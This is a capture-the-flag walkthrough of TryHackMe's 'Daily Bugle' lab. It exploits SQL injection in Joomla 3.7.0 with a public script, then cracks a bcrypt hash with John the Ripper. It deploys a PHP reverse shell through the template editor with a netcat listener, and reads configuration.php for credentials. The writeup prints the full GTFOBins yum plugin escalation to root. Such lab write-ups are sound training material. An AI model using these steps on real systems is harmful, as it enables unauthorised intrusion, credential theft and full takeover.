# [Daily Bugle](https://tryhackme.com/room/dailybugle)

## Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum

# Deploy

### Access the web server, who robbed the bank?

1. Enumerate all services running on the target machine with `nmap`

[SCREEN01]

2. Go to the `http://IP/`, the headline article states that **spiderman** robbed the bank

[SCREEN02]

---

### Obtain user and root

## Hack into the machine and obtain the root user's credentials

### What is the Joomla version?

_Hint: I wonder if this version of Joomla is vulnerable..._

1. Use `joomscan` to identify the exact Joomla version:
   - The version is **3.7.0**

```bash
git clone https://github.com/OWASP/joomscan.git
cd joomscan
chmod +x joomscan.pl
perl joomscan.pl --url http://IP
```

[SCREEN03]

---

### What is Jonah's cracked password?

_Hint: SQLi & JohnTheRipper_

1. Use the [Exploit-Joomla](https://github.com/stefanlucas/Exploit-Joomla) python script

```bash
python3 joomblah.py http://IP/
```

[SCREEN04]

2. Copy the password hash, and crack it with John the Ripper
   - The password is **spiderman123**

```bash
echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > jonah_hash.txt
john --format=bcrypt --wordlist=/root/Tools/wordlists/rockyou.txt jonah_hash.txt
```

[SCREEN05]

---

### What is the user flag?

1. Perform directory enumeration to identify the admin login page

```bash
gobuster dir -u http://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,js
```

[SCREEN06]

2. Log in to the Joomla administrator panel at `http://IP/administrator/index.php` with `jonah:spiderman123`

3. Paste [PHP Reverse Shell payload](https://github.com/mosec0/Reverse-Shell/blob/main/reverse-shell.php) in template. For example: `http://10.10.48.111/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA`

4. Deploy a [PHP reverse shell](https://github.com/mosec0/Reverse-Shell/blob/main/reverse-shell.php) through the template editor at `http://IP/administrator/index.php?option=com_templates&view=template&id=503&file=L2luZGV4LnBocA`

5. Set up a netcat listener on your attacking machine and trigger the reverse shell by visiting the modified template page in the browser

```bash
nc -lvnp 4444
```

[SCREEN07]

5. From the initial shell, examine the website configuration to find credentials

```bash
cd /var/www/html
cat configuration.php
```

[SCREEN08]

6. Use the discovered password to switch to the `jjameson` user

```bash
su jjameson

# Upgrade shell to interactive PTY
python -c 'import pty; pty.spawn("/bin/bash")'
```

[SCREEN09]

7. Retrieve the user flag

```bash
cat /home/jjameson/user.txt
```

[SCREEN10]

---

### What is the root flag?

1. Check for privilege escalation vectors

```bash
sudo -l
```

[SCREEN11]

2. Exploit the `yum` plugin functionality to gain root access using a method from [GTFOBins](https://gtfobins.github.io/gtfobins/yum/)

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y

whoami
```

[SCREEN12]

3. Retrieve the root flag

```bash
cat /root/root.txt
```

[SCREEN13]
